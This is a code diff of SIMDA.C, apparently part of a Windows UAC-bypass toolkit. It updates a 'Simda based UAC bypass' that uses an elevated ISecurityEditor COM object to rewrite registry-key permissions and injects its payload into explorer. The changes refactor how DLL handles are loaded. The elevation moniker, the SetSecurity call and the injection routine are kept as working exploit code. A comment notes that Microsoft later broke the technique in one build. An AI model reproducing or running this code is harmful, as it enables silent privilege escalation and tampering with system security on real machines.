@@ -4,9 +4,9 @@
 *
 *  TITLE:       SIMDA.C
 *
-*  VERSION:     1.60
+*  VERSION:     1.91
 *
-*  DATE:        20 Apr 2015
+*  DATE:        12 Oct 2015
 *
 *  Simda based UAC bypass using ISecurityEditor.
 *
@@ -89,7 +89,7 @@ DWORD WINAPI ucmElevatedDisableProc(
 		r = SecurityEditor1->lpVtbl->SetSecurity(
 			SecurityEditor1,
 			elvpar->szKey,
-			SE_REGISTRY_KEY,
+			SE_REGISTRY_KEY, /* this was later banned by ms in 10147 build by adding primitive crunch destroying original function logic */ 
 			DACL_SECURITY_INFORMATION,
 			elvpar->szNewSDDL
 			);
@@ -123,10 +123,8 @@ BOOL ucmSimdaAlterKeySecurity(
 	LPWSTR lpSddlString
 	)
 {
-	BOOL		cond = FALSE, bResult = FALSE;
-	HINSTANCE   hKrnl, hOle32, hShell32;
-
-	SIZE_T		cch;
+	BOOL    cond = FALSE, bResult = FALSE;
+	SIZE_T  cch;
 
 	//just a basic check
 	if (
@@ -149,29 +147,6 @@ BOOL ucmSimdaAlterKeySecurity(
 
 	do {
 
-		// load/reference required dlls 
-		hKrnl = GetModuleHandle(KERNEL32DLL);
-		if (hKrnl == NULL) {
-			//just to shut up mars.
-			break;
-		}
-
-		hOle32 = GetModuleHandle(OLE32DLL);
-		if (hOle32 == NULL) {
-			hOle32 = LoadLibrary(OLE32DLL);
-			if (hOle32 == NULL)	{
-				break;
-			}
-		}
-
-		hShell32 = GetModuleHandle(SHELL32DLL);
-		if (hShell32 == NULL) {
-			hShell32 = LoadLibrary(SHELL32DLL);
-			if (hShell32 == NULL) {
-				break;
-			}
-		}
-
 		_strcpy_w(g_ElevParams2.EleMoniker, L"Elevation:Administrator!new:{4D111E08-CBF7-4f12-A926-2C7920AF52FC}");
 		_strcpy_w(g_ElevParams2.szKey, lpTargetKey);
 		_strcpy_w(g_ElevParams2.szNewSDDL, lpSddlString);
@@ -188,11 +163,11 @@ BOOL ucmSimdaAlterKeySecurity(
 			break;
 		}
 
-		g_ElevParams2.xCoInitialize = (pfnCoInitialize)GetProcAddress(hOle32, "CoInitialize");
-		g_ElevParams2.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(hOle32, "CoCreateInstance");
-		g_ElevParams2.xCoGetObject = (pfnCoGetObject)GetProcAddress(hOle32, "CoGetObject");
-		g_ElevParams2.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(hOle32, "CoUninitialize");
-		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(hKrnl, "OutputDebugStringW");
+		g_ElevParams2.xCoInitialize = (pfnCoInitialize)GetProcAddress(g_ldp.hOle32, "CoInitialize");
+		g_ElevParams2.xCoCreateInstance = (pfnCoCreateInstance)GetProcAddress(g_ldp.hOle32, "CoCreateInstance");
+		g_ElevParams2.xCoGetObject = (pfnCoGetObject)GetProcAddress(g_ldp.hOle32, "CoGetObject");
+		g_ElevParams2.xCoUninitialize = (pfnCoUninitialize)GetProcAddress(g_ldp.hOle32, "CoUninitialize");
+		g_ElevParams2.xOutputDebugStringW = (pfnOutputDebugStringW)GetProcAddress(g_ldp.hKernel32, "OutputDebugStringW");
 
 		bResult = ucmInjectExplorer(&g_ElevParams2, ucmElevatedDisableProc);
 
